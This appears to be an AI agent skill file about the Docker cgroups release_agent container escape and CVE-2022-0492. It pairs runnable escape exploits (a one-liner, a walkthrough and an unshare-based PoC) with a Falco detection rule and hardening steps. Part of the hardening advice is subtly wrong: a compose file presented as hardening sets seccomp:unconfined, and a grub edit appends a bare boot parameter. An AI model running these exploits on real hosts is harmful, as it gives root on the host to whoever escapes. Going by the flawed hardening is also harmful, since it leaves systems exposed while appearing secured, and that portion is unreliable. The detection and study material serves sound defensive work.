---
name: docker-cgroups-escape
description: Use this skill when investigating Docker container escapes via cgroups release_agent vulnerability (CVE-2022-0492). Trigger when users mention container escape, privilege escalation, cgroups, release_agent, or need to understand/defend against this specific attack vector. Also use for CTF challenges involving container breakout or security assessments of containerized environments.
---

# Docker Cgroups Release Agent Container Escape

This skill covers the **cgroups v1 release_agent** container escape technique, including the classic PoC and **CVE-2022-0492** (2022 kernel vulnerability).

## When to Use This Skill

- Analyzing container escape vulnerabilities in security assessments
- CTF challenges involving Docker/Kubernetes privilege escalation
- Understanding cgroups-based attack vectors
- Implementing detection rules for container escapes
- Hardening containerized environments against this class of exploits

## Attack Overview

The vulnerability abuses the **cgroup-v1 `release_agent`** feature:

1. When the last task of a cgroup with `notify_on_release=1` exits
2. The kernel executes the program stored in `release_agent` **in the initial namespaces on the host**
3. This execution happens with **full root privileges on the host**
4. Writing to `release_agent` is enough for container escape

### CVE-2022-0492 (February 2022)

**The kernel did not verify capabilities when writing to `release_agent`** in cgroup-v1.

- **CVSS**: 7.8 / High
- **Impact**: Privilege escalation to root on host, container escape without privileged container
- **Fixed in**: 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299
- **Patch**: `1e85af15da28 "cgroup: Fix permission checking"`

## Classic PoC (2019)

### One-liner version

```bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

### Step-by-step walkthrough

```bash
# 1. Prepare a new cgroup
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # or -o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# 2. Point release_agent to attacker-controlled script on host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 3. Drop the payload
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd

# 4. Trigger the notifier
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # add ourselves and immediately exit
cat /output                                  # now contains host processes
```

## CVE-2022-0492 Minimal Exploit

```bash
# Prerequisites: container run as root, no seccomp/AppArmor, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
  mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
  echo 1 > /tmp/c/notify_on_release;
  echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
  (sleep 1; echo 0 > /tmp/c/cgroup.procs) &
  while true; do sleep 1; done
'
```

If the kernel is vulnerable, the busybox binary from the **host** executes with full root.

## Detection

### Falco Rule (v0.32+)

```yaml
- rule: Detect release_agent File Container Escapes
  desc: Detect an attempt to exploit a container escape using release_agent
  condition: open_write and container and fd.name endswith release_agent and
             (user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
             thread.cap_effective contains CAP_SYS_ADMIN
  output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
  priority: CRITICAL
  tags: [container, privilege_escalation]
```

### Manual Detection

```bash
# Check for writes to release_agent files
auditctl -w /sys/fs/cgroup -p wa -k cgroup_release_agent

# Monitor for suspicious cgroup mounts
auditctl -a exit,always -F arch=b64 -S mount -k cgroup_mount
```

## Hardening & Mitigations

### 1. Update the Kernel

Ensure kernel version is at or above the patched versions:
- 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299

### 2. Prefer cgroup-v2

The unified hierarchy **removed the `release_agent` feature completely**.

```bash
# Check cgroup version
cat /proc/filesystems | grep cgroup
# cgroup-v2 shows "cgroup2" without "cgroup"

# Enable cgroup-v2 in kernel boot parameters
echo "cgroup_no_v1=all" >> /etc/default/grub
```

### 3. Disable Unprivileged User Namespaces

```bash
sysctl -w kernel.unprivileged_userns_clone=0
# Make permanent
echo "kernel.unprivileged_userns_clone=0" >> /etc/sysctl.conf
```

### 4. Mandatory Access Control

**AppArmor/SELinux** policies that deny:
- `mount` operations
- `openat` on `/sys/fs/cgroup/**/release_agent`
- Drop `CAP_SYS_ADMIN`

### 5. Read-only Bind-Mask release_agent Files

```bash
for f in $(find /sys/fs/cgroup -name release_agent); do
    mount --bind -o ro /dev/null "$f"
done
```

### 6. Docker/Kubernetes Runtime Hardening

```yaml
# docker-compose.yml
services:
  app:
    security_opt:
      - no-new-privileges:true
      - seccomp:unconfined  # or use custom profile
    cap_drop:
      - ALL
      - SYS_ADMIN
    read_only: true
```

```yaml
# Kubernetes Pod Security Context
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop:
      - ALL
```

## Quick Reference

| Check | Command | Expected (Safe) |
|-------|---------|----------------|
| Kernel version | `uname -r` | ≥ patched version |
| Cgroup version | `stat -fc %T /sys/fs/cgroup` | `cgroup2fs` |
| User namespaces | `sysctl kernel.unprivileged_userns_clone` | `0` |
| release_agent writable | `ls -la /sys/fs/cgroup/*/release_agent` | `ro` or masked |

## References

- [Trail of Bits - Understanding Docker Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Unit 42 - CVE-2022-0492 Analysis](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [Sysdig Falco Detection Guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)
- [Kernel Patch Commit](https://github.com/torvalds/linux/commit/1e85af15da28)
